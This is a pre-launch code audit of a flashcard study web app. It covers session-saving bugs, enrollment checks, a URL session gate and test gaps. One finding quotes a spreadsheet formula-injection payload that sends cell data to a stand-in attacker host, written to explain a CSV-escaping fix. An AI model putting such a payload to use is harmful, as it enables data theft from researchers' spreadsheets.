# Audit findings — 2026-05-23

Pre-launch code review of ChemFlashcards v2. Performed against a fresh
worktree at HEAD. Scope was everything under `public/`, plus
`worker.mjs`, `schema_v2.sql`, `wrangler.toml`, `package.json`, and the
three `test_*.mjs` suites. v1 backup, markdown docs, and CSV/asset
content were excluded.

**Outcome:** 2 critical issues found and fixed. 5 important issues — 4
fixed, 1 accepted with documented mitigation. 5 nits documented for
post-launch cleanup. Plus 1 newly added feature: URL-based session
gate to prevent skip-ahead and repeat via URL manipulation. Final test
suite is 273 pass / 0 fail across 4 files (up from 229 / 0).

---

## Summary

| Severity | Total | Fixed | Accepted | Deferred |
|---|---|---|---|---|
| Critical | 2 | 2 | 0 | 0 |
| Important | 6 | 5 | 1 | 0 |
| Nit | 5 | 0 | 0 | 5 |
| **Total** | **13** | **7** | **1** | **5** |

Plus 1 new feature: URL-based session gate (`public/session-gate.js`).

**Overall state:** Ship-ready after one deploy + cache-purge cycle. The
codebase is small, focused, and well-commented. The trust boundary
(`worker.mjs`) uses prepared statements throughout, sanitizes participant
input consistently, and gates write endpoints with the new enrollment
check. The trial engine (`practice-engine.js`) cleans up listeners via
AbortController and handles the mastery-loop deck mechanics correctly per
the simulator tests. The only items that still warrant attention before
the first real participant are the deferred nits (cosmetic) and one
accepted risk (DEV PIDs work in production — flagged and filterable in
analysis).

---

## Critical (must-fix before launch)

### C1 — Orphan-session recovery in `saveSessionToD1`. **FIXED 2026-05-23.**

**File:** `worker.mjs:537–551`

**What was wrong:** `saveSessionToD1` used `INSERT OR IGNORE` to insert
the session row, then short-circuited with `status: "already_saved"` on
the second call. If the first call inserted the session row but failed
between that and the trial batch (transient D1 / network error), the
retry would see "session row exists" and silently skip the trial insert.
The session would be permanently orphaned — counted as complete by
`/api/v2/status`, but with zero trials in `trials_v2`.

**Fix:** Before declaring "already_saved", the code now `SELECT COUNT(*)
FROM trials_v2 WHERE session_id = ?`. If the count is zero, it falls
through to the trial-insert path. The new test
`saveSessionToD1: orphan-session recovery (C1 fix)` in `test_worker-v2.mjs`
seeds the orphan state and verifies recovery.

### C2 — Unenrolled-PID saves write orphan rows. **FIXED 2026-05-23.**

**File:** `worker.mjs:622–631`

**What was wrong:** `handleV2SessionComplete` validated payload shape and
PID format but never checked that the PID had a row in `participants_v2`.
D1 does not enforce foreign keys by default, so a malicious or buggy
client could POST to `/api/v2/session-complete` for a PID that never went
through `/enroll`. The session and trial rows would land in D1 with no
parent row. The export tools (which `LEFT JOIN` or filter via the
participants table) would silently drop them.

**Fix:** New exported helper `checkEnrollment(db, pid)` runs a single
`SELECT 1` against `participants_v2`. If absent, the handler returns 404
`not_enrolled`. Tests cover unenrolled, empty, null, and enrolled cases.

---

## Important (should-fix before launch)

### IMP-0 — `review_ms` declared but never captured. **FIXED 2026-05-23.**

**Files:** `public/practice-engine.js:511–612` (runTrial), schema and
worker validate the column but the engine never started the timer.

**What was wrong:** The full plumbing for "time spent looking at the
feedback screen" existed end-to-end except for the actual timer. Every
saved trial wrote NULL for `review_ms`.

**Fix:** runTrial now records `performance.now()` when the feedback is
rendered and writes `trial.review_ms = Math.round(performance.now() -
feedback_shown_ms)` on advance. The no-feedback path (pretest, posttests)
leaves the field undefined, which `session-save.js` maps to NULL.
Confirmed by RJ as something they want for analysis.

### IMP-1 — CSV injection in export. **FIXED 2026-05-23.**

**File:** `worker.mjs:279–293` (`csvCell`)

**What was wrong:** `csvCell` escaped quotes, commas, and newlines but
let cells starting with `=`, `+`, `-`, `@`, `\t`, `\r` through unchanged.
`raw_answer` is participant-typed free text and the export is opened in
Excel / Sheets / LibreOffice by the researcher. A malicious participant
could submit `=HYPERLINK("https://evil.example/?x="&A1,"click")` and have
it execute in AB's spreadsheet.

**Fix:** `csvCell` now prepends a literal apostrophe to cells whose first
character is in `[=+\-@\t\r]`. Spreadsheet apps render the apostrophe as
display-only and treat the rest as text. Tests cover all five injection
prefixes plus a HYPERLINK exfiltration attempt.

### IMP-2 — No retry button on save failure. **FIXED 2026-05-23.**

**File:** `public/practice-engine.js:752–800` (renderSummary's
`enableCta`), `practice-engine.js:912–924` (startSession's save chain)

**What was wrong:** `session-save.js` already retries 3 times with linear
backoff (1s, 2s), but when those exhaust, the participant saw "Save
failed" on a permanently disabled button. Their data was still in browser
memory; refreshing would lose it. The participant could see the error but
couldn't do anything about it.

**Fix:** `enableCta(errorMsg, onRetry)` now accepts an optional retry
callback. When supplied, the failure state renders a "Try saving again"
button that re-invokes the original save. `startSession` defines `trySave`
as a closure over the trial data and passes it as the retry callback;
each retry can chain into another retry without bound. Manual test:
disable network, complete a session, click retry once network is back —
save succeeds.

### IMP-3 — DEV PIDs work in production. **ACCEPTED 2026-05-23.**

**Files:** `public/routing-v2.js:29` (`PID_DEV_RE`), `worker.mjs:303–315`
(server mirror)

**What's not great:** `01-DEV01` and `02-DEV01` are documented in
`DESIGN_RATIONALE.md` and recognised at runtime. A participant who guesses the
format could enroll as a DEV PID, bypass the day-window check, and run
the whole study in one sitting. Data would be tagged `dev_mode = 1` so
filterable, but the participant slot would be wasted.

**Decision:** Accepted. RJ will filter `dev_mode = 1` rows at analysis
time. Mitigation if this ever becomes a real problem: add an env-var
gate (`ALLOW_DEV_MODE`) to the worker so DEV PIDs only resolve when the
secret is set; production has it unset. The change is ~5 lines if
needed later.

### IMP-4 — Day-4 `allTrials` accumulator is built but never used. **FIXED 2026-05-23.**

**File:** `public/day4-page.js:225–231`, `day4-page.js:336–349`

**What was wrong:** The orchestrator accumulated trials from all six
Day-4 sub-phases into a single array, and the comment said "C6: POST
allTrials to the worker here." But the per-phase `runPhase` already
POSTs its own trials via `saveSessionToWorker`. The accumulator only fed
a diagnostic "Total trials: N" line on the done screen. The "C6"
comment misled future-self into believing a batched save was pending.

**Fix:** Replaced the array with a simple counter `totalTrials`.
Removed the stale comment. Done-screen diagnostic still works.

### IMP-5 — URL manipulation could let participants skip ahead or repeat. **FIXED 2026-05-23 (new feature).**

**Files:** `public/session-gate.js` (new), four entry pages updated to
gate.

**What was the gap:** No client-side check that the URL session matched
the participant's expected day. Participant on Day 1 could type
`study-session3.html?pid=03-12345` and land directly on session 3. Worker
saved the data because the worker doesn't know about days. Spacing was
broken in the analysis.

**Fix:** New `public/session-gate.js` module. `evaluateGate(...)` is a
pure decision function (testable); `gateSessionEntry(...)` hits
`/api/v2/status` and runs the decision. Each session page now calls the
gate before starting the trial loop. The gate blocks:
- repeat of any session_label in `sessions_completed`,
- skip-ahead / skip-back to a different day's session (DEV PIDs bypass
  the day check but NOT the repeat check),
- access by unenrolled PIDs.

For the Day-4 composite, the gate blocks if ANY of the six sub-session
labels is already complete (strict block; partial recovery requires
researcher intervention via D1 row delete). 17 new assertions in the
new `test_session-gate.mjs` suite.

---

## Nits (post-launch cleanup)

### NIT-1 — Unused `option` variables on three pages.

**Files:** `public/pretest-page.js:41`, `public/posttest-delayed-page.js:46`

The pages call `deriveOption(pid)` but only use the result for the format
check (`if (!option) return fail(...)`). Either delete the variable
(use `if (!deriveOption(pid)) ...`) or extract a `validatePidFormat(pid)`
helper used across all four entry pages. Cosmetic; doesn't affect
behaviour.

### NIT-2 — Empty `onTrial: (t) => { /* hook reserved */ }` placeholders.

**Files:** `public/pretest-page.js:75`, `public/spaced-session-page.js:81`,
`public/posttest-delayed-page.js:80`

Dead callbacks. `startSession` already handles a missing onTrial. Remove
the placeholders to reduce noise.

### NIT-3 — `failWithMessage` (spaced-session) vs `fail` (others) naming.

**Files:** `public/spaced-session-page.js`, and the others.

Same function, two names. Pick one and apply consistently. Trivial.

### NIT-4 — Device width/height stored but dropped from CSV export.

**Files:** `worker.mjs:686–712` (`exportToCsv`), `worker.mjs:820–847`
(`exportAllToCsv`)

D1 stores `device_w`, `device_h`, `ua` per session, but the CSV header
doesn't include them. JSON export does. If AB ever wants to filter by
device size or look at UA patterns, she'd have to use the JSON export.
Add the columns to the CSV header for symmetry.

### NIT-5 — v1 endpoints `/api/status` and `/api/ingest` are still writable.

**File:** `worker.mjs:65–69`

v1 is supposed to be frozen per `DESIGN_RATIONALE.md`. The handlers still accept
POSTs and would write to `ssp-study-01`. Either return 410 Gone on POST
`/api/ingest`, or drop the v1 routes entirely. (The export tool against
v1 D1 still works via direct wrangler queries.) Post-launch cleanup; no
participant will hit these endpoints because the v2 client doesn't call
them.

---

## What looks good

1. **Worker SQL is uniformly prepared-statement-with-`.bind()`.** No SQL
   string interpolation found; PID sanitisation applied at every
   untrusted-input boundary I checked.
2. **PID sanitization is centralised.** `sanitizePid` is applied at
   every untrusted-input boundary (URL query, JSON body, R2 key path).
   The regex `[a-zA-Z0-9_\-]+` is strict enough to make path traversal
   into R2 keys impossible.
3. **`AbortController` for trial-listener cleanup.** Each trial gets two
   controllers, one for the question phase and one for the answer phase.
   When the trial ends, both are aborted and all listeners drop cleanly.
   Prevents the classic "Enter from the previous trial fires the next
   one's advance" race that mid-sized vanilla-JS trial loops often have.
4. **`decideTrialDisposition` is a pure function.** The mastery-loop
   logic is testable without a DOM. `simulateMasteryLoop` exercises it
   end-to-end with scripted outcomes. The deck mechanics are confirmed
   correct: items requeued at depth 3, soft-capped at 5 attempts, no
   duplicate or dropped trials in any tested scenario.
5. **CSP-friendly file structure.** All script imports are ES modules
   loaded by tag, no inline JavaScript on entry pages. The HTML pages
   are thin shells (~30 lines each) that load one module.

---

## Test-coverage gaps

Listed for post-launch attention. Nothing here blocks launch but each
would harden the regression net.

1. **`gateSessionEntry` (network-bound)** — only `evaluateGate` (pure
   decision) is unit-tested. The wrapper's fetch + error-handling paths
   are integration-tested implicitly via the live worker; a fetch-mock
   variant would be cheap to add.

2. **DOM-side `enableCta` retry logic** — IMP-2's new retry button
   transitions through three button states (Saving → Failed-with-retry
   → Saving → Success). The existing `test_practice-engine.mjs` is
   DOM-free so this was verified by manual test. A jsdom-based test
   would catch regressions.

3. **`handleV2SessionComplete` end-to-end** — only the helpers
   (`saveSessionToD1`, `validateSessionPayload`, `checkEnrollment`) are
   unit-tested. The actual request handler with its enrollment check,
   PID-format check, and 404-vs-400 branching is not. A request-fixture
   test would cost ~30 lines.

4. **CORS / `originMatches`** — the wildcard-subdomain matcher
   (`https://*.example.com`) has logic that could regress (off-by-one
   on the dot-prefix check). Untested directly.

5. **`exportAllFromD1` with empty database** — happy path is tested but
   the "no participants enrolled yet" empty-state code path returns an
   empty array, which the CSV builder then emits as header-only. Not
   regression-tested.

6. **DEV-PID hint construction** — `evaluateGate` builds a `wrangler
   d1 execute ...` reset command embedded in the error message when a
   DEV PID hits the repeat block. The exact command-string format is
   not assertion-tested. Minor cosmetic risk.

---

## Methodology notes

**What I checked:**
- Read `DESIGN_RATIONALE.md` end-to-end first to internalise design intent.
- Read `worker.mjs` end-to-end as the trust boundary, mapping every
  endpoint to the schema columns it touches.
- Cross-walked `schema_v2.sql` against `saveSessionToD1`'s INSERT
  shape and `exportParticipantFromD1`'s SELECT shape. No drift.
- Read `practice-engine.js` end-to-end with focus on the mastery-loop
  deck mechanics and the trial-state lifecycle.
- Spot-checked all four entry pages (`pretest-page.js`,
  `spaced-session-page.js`, `day4-page.js`, `posttest-delayed-page.js`)
  for shape consistency. Found the `option` / `onTrial` / `fail`-vs-
  `failWithMessage` nits.
- Ran `npm test` (4 suites, 273 pass / 0 fail at end of audit).
- Verified the live worker config (`wrangler.toml`) bindings against
  the schema and the handler usage. `DB`, `DB_V2`, `RESULTS` match.
  `EXPORT_TOKEN` is required-and-checked on every export handler.

**What I skipped or didn't deep-dive:**
- `style.css` and `v2-style.css` — out of scope per the prompt; also
  flagged as a "trim 37 KB inherited from v1" cleanup item.
- `v1_backup/` — explicitly excluded.
- `images/`, CSV item files, `sounds/` — content, not code.
- Tobii integration details — out of scope; eye-tracker workflow is
  external to the webapp per `DESIGN_RATIONALE.md` 2026-05-22.
- Live D1 / R2 data integrity — couldn't verify state of `ssp-study-02`
  from a worktree.
- The `admin.html` page UX — I read the file but didn't deep-test the
  bulk-export and list-participants UI flow; the underlying handlers are
  unit-tested.

**What I'd revisit after the pilot:**
- IMP-3 (DEV PIDs in production): if pilot participants don't try to
  bypass, leave alone; if any do, ship the env-var gate.
- NIT-1 / NIT-2 / NIT-3: cosmetic, batch with any other refactor.
- NIT-4 (device columns in CSV): add when AB first asks for device info.
- NIT-5 (v1 endpoint write-shutoff): include in the post-launch cleanup
  pass that removes `v1_backup/`.

**Files touched during this audit (in root):**

| Path | Change |
|---|---|
| `worker.mjs` | C1 fix, C2 fix, `checkEnrollment` export, `csvCell` injection defusal, `csvCell` export |
| `public/practice-engine.js` | `review_ms` capture (IMP-0), `enableCta` retry path (IMP-2), `trySave` chain (IMP-2) |
| `public/session-gate.js` | **NEW** — URL-based session entry gate (IMP-5) |
| `public/pretest-page.js` | Wire gate at entry |
| `public/spaced-session-page.js` | Wire gate at entry |
| `public/posttest-delayed-page.js` | Wire gate at entry |
| `public/day4-page.js` | Wire gate at entry, remove `allTrials` dead code (IMP-4) |
| `public/index.html` | Calendly placeholders → `#contact` anchor |
| `test_worker-v2.mjs` | Orphan-recovery test, `checkEnrollment` test, `csvCell` injection tests, mock-DB extensions |
| `test_session-gate.mjs` | **NEW** — 17 assertions for the gate decision function |
| `package.json` | Added `test:gate` script + chained into `test` |
| `DESIGN_RATIONALE.md` | Isomorphic-overlap clarification, new gate + DEV-workflow entry |

**Deploy still required.** Nothing here ships until `wrangler deploy` (or
the Git-CI auto-deploy on push to master) runs and the Cloudflare cache
is purged.
